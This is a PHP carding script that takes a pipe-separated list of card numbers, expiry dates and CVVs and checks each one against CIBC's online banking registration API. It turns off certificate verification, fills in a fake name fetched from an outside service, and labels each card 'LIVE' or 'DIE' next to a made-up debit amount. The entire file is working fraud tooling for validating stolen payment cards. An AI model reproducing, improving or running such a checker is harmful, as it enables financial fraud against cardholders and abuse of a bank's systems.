<?php 



error_reporting(0);
set_time_limit(0);
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$numero = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
If(strlen($ano) > 2)
{
  $ano = substr($ano,2,3);
}
if(strpos($lista, '|')){

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://cubetechnology.org/api');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$getdados = curl_exec($ch);

$decoder = json_decode($getdados,true);
$nome = $decoder['name'];
$last = $decoder['lastname'];






$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.cibconline.cibc.com/ebm-anp/api/v1/json/sessions");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: www.cibconline.cibc.com',
'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept: application/vnd.api+json',
'Accept-Language: en',
'Accept-Encoding: gzip, deflate, br',
'Content-Type: application/vnd.api+json',
'Client-Type: default_web',
'X-Auth-Token: null',
'brand: cibc',
'WWW-Authenticate: CardAndExpiryDate',
'X-Requested-With: XMLHttpRequest',
'Referer: https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/index.html',
'Connection: keep-alive'
    ));
     curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":{"value":"'.$numero.'","description":"","encrypted":"false","encrypt":"true"},"expiryDate":{"year":"'.$ano.'","month":"'.$mes.'"},"txType":"REGIST"}');

$data = curl_exec($ch);


if (strpos($data, 'problems')) { 
  echo '<font color="red" style="font-size: 15px">DIE → '.$lista.'<br></font>';
  }
  else if (strpos($data, 'transactionId')){

$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];


  echo '<font color="lime" style="font-size: 15px">LIVE → '.$lista.' | Debitou: '.$debitouu.' | Nome: '.$nome.' '.$last.' #FlashReverso<br></font>';
}
else{
    echo '<font color="red" style="font-size: 15px"> DONATE CAIU <br></font>';
}
}
ob_flush();
 ?>
